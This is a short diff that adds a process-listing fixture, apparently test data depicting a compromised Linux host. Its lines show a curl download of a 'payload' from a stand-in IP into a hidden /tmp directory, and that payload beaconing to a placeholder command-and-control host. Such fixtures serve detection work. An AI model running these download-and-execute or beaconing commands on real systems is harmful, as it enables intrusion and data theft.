@@ -1,0 +1,5 @@
+1001 root /usr/sbin/sshd -D
+1220 root /bin/bash /tmp/update.sh
+1225 root /usr/bin/python3 -m http.server 8088 --directory /tmp/.cache
+1230 deploy /usr/bin/curl -fsSL http://198.51.100.9/payload -o /tmp/.cache/payload
+1242 deploy /tmp/.cache/payload --beacon https://c2.invalid/collect
